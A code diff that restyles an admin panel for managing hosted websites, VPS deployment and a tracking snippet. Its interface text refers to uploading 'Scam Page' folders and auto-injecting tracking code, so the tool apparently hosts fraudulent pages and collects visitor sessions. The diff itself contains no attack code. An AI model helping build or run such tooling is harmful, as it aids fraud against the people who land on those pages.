@@ -132,11 +132,11 @@ const SettingsWebsites = (() => {
             </div>
 
             <!-- VPS badge -->
-            <div style="display:flex;align-items:center;gap:6px;padding:5px 10px;border-radius:8px;margin-bottom:6px;${w.vps_host ? 'background:rgba(20,184,166,.08);border:1px solid rgba(20,184,166,.2);' : 'background:rgba(100,116,139,.06);border:1px solid rgba(100,116,139,.12);'}">
-              <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="${w.vps_host ? '#14b8a6' : '#64748b'}" stroke-width="2"><rect x="2" y="2" width="20" height="8" rx="2"/><rect x="2" y="14" width="20" height="8" rx="2"/><circle cx="6" cy="6" r="1" ${w.vps_host ? 'fill="#14b8a6"' : ''}/><circle cx="6" cy="18" r="1" ${w.vps_host ? 'fill="#14b8a6"' : ''}/></svg>
+            <div class="website-vps-badge ${w.vps_host ? 'website-vps-badge--ok' : ''}">
+              <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="${w.vps_host ? '#14b8a6' : 'var(--text-muted)'}" stroke-width="2" style="flex-shrink:0;"><rect x="2" y="2" width="20" height="8" rx="2"/><rect x="2" y="14" width="20" height="8" rx="2"/><circle cx="6" cy="6" r="1" ${w.vps_host ? 'fill="#14b8a6"' : ''}/><circle cx="6" cy="18" r="1" ${w.vps_host ? 'fill="#14b8a6"' : ''}/></svg>
               ${w.vps_host
-                ? `<span style="font-size:10px;font-weight:700;color:#5eead4;">VPS</span><span style="font-size:10px;color:#94a3b8;font-family:var(--font-mono);">${escapeHtml(w.vps_host)}</span>`
-                : `<span style="font-size:10px;font-weight:600;color:#64748b;">No VPS configured</span>`}
+                ? `<span class="website-vps-tag">VPS</span><span class="website-vps-host">${escapeHtml(w.vps_host)}</span>`
+                : `<span style="font-size:10px;font-weight:600;color:var(--text-muted);">No VPS configured</span>`}
             </div>
 
             <!-- Active toggle row -->
@@ -165,15 +165,13 @@ const SettingsWebsites = (() => {
             </button>
             <button class="website-action-btn website-deploy-btn"
               data-id="${w.id}" data-name="${escapeHtml(w.name)}" data-slug="${escapeHtml(w.demo_slug || '')}"
-              title="Host on VPS"
-              style="background:linear-gradient(135deg,rgba(20,184,166,0.15),rgba(59,130,246,0.15));border-color:rgba(20,184,166,0.4);color:#5eead4;">
+              title="Host on VPS">
               <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M2 12s5-6 10-6 10 6 10 6-5 6-10 6-10-6-10-6z"/><path d="M12 4v2m0 12v2M5 12h2m10 0h2"/></svg>
               Host
             </button>
             ${w.vps_host ? `<button class="website-action-btn website-quick-deploy-btn"
               data-id="${w.id}"
-              title="Quick redeploy files to VPS"
-              style="background:rgba(20,184,166,0.10);border-color:rgba(20,184,166,0.3);color:#5eead4;">
+              title="Quick redeploy files to VPS">
               <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="23 4 23 10 17 10"/><path d="M20.49 15a9 9 0 1 1-2.12-9.36L23 10"/></svg>
               Redeploy
             </button>` : ''}
@@ -201,16 +199,16 @@ const SettingsWebsites = (() => {
           </p>
           <div style="position:relative;">
             <pre style="
-              margin:0;padding:14px 16px;background:rgba(0,0,0,0.3);border:1px solid var(--border-primary);
-              border-radius:10px;font-family:var(--font-mono);font-size:12px;color:#a5b4fc;
+              margin:0;padding:14px 72px 14px 16px;background:var(--bg-tertiary);border:1px solid var(--border-primary);
+              border-radius:10px;font-family:var(--font-mono);font-size:12px;color:var(--accent-primary);
               overflow-x:auto;white-space:pre-wrap;word-break:break-all;
             " id="modal-snippet-text">${escapeHtml(snippet)}</pre>
             <button class="btn btn-sm btn-secondary" onclick="window.copyToClipboard(document.getElementById('modal-snippet-text').textContent,'Snippet copied!');" style="
               position:absolute;top:8px;right:8px;height:28px;padding:0 12px;font-size:11px;
             ">Copy</button>
           </div>
-          <div style="background:rgba(99,102,241,0.06);border:1px solid rgba(99,102,241,0.12);border-radius:10px;padding:12px 14px;">
-            <h4 style="color:#a5b4fc;font-size:12px;font-weight:600;margin:0 0 6px 0;text-transform:uppercase;letter-spacing:0.5px;">Auto-injection for Demo Pages</h4>
+          <div style="background:color-mix(in srgb, var(--accent-primary) 7%, transparent);border:1px solid color-mix(in srgb, var(--accent-primary) 20%, transparent);border-radius:10px;padding:12px 14px;">
+            <h4 style="color:var(--accent-primary);font-size:12px;font-weight:600;margin:0 0 6px 0;text-transform:uppercase;letter-spacing:0.5px;">Auto-injection for Demo Pages</h4>
             <p style="color:var(--text-secondary);font-size:11px;line-height:1.4;margin:0;">
               Note: For <strong>Scam Pages</strong> uploaded to this panel, the tracking code is <strong>automatically injected</strong> by the server. You do not need to embed this script manually!
             </p>
@@ -253,13 +251,13 @@ const SettingsWebsites = (() => {
                   <input type="text" id="modal-website-color-hex" class="form-input" placeholder="#6366f1" value="#6366f1" style="flex:1;" />
                 </div>
               </div>
-              <div style="border:1px solid rgba(99,102,241,0.18);border-radius:12px;padding:12px 14px;background:rgba(99,102,241,0.05);">
-                <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:8px;">
-                  <div>
-                    <div style="font-size:12px;font-weight:700;color:#a5b4fc;">📁 Upload Scam Page Folder</div>
+              <div style="border:1px solid color-mix(in srgb, var(--accent-primary) 24%, transparent);border-radius:12px;padding:12px 14px;background:color-mix(in srgb, var(--accent-primary) 6%, transparent);">
+                <div style="display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:8px;margin-bottom:8px;">
+                  <div style="min-width:0;flex:1 1 180px;">
+                    <div style="font-size:12px;font-weight:700;color:var(--accent-primary);">📁 Upload Scam Page Folder</div>
                     <div style="font-size:11px;color:var(--text-muted);margin-top:2px;">All files in the folder will be uploaded (HTML, CSS, images, etc.) — optional</div>
                   </div>
-                  <button type="button" id="modal-folder-btn" class="btn btn-sm btn-outline" style="display:flex;align-items:center;gap:5px;padding:6px 12px;border-color:rgba(99,102,241,0.3);color:#a5b4fc;font-size:11px;">
+                  <button type="button" id="modal-folder-btn" class="btn btn-sm btn-outline" style="display:flex;align-items:center;gap:5px;padding:6px 12px;font-size:11px;">
                     <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M22 19a2 2 0 01-2 2H4a2 2 0 01-2-2V5a2 2 0 012-2h5l2 3h9a2 2 0 012 2z"/></svg>
                     Choose Folder
                   </button>
@@ -552,6 +550,7 @@ const SettingsWebsites = (() => {
         if (deleteBtn) {
           window.showModal({
             title: 'Delete Website',
+            type: 'danger',
             content: '<p style="color:var(--text-secondary);">Are you sure? All sessions and data for this website will be lost.</p>',
             onConfirm: async () => {
               try {
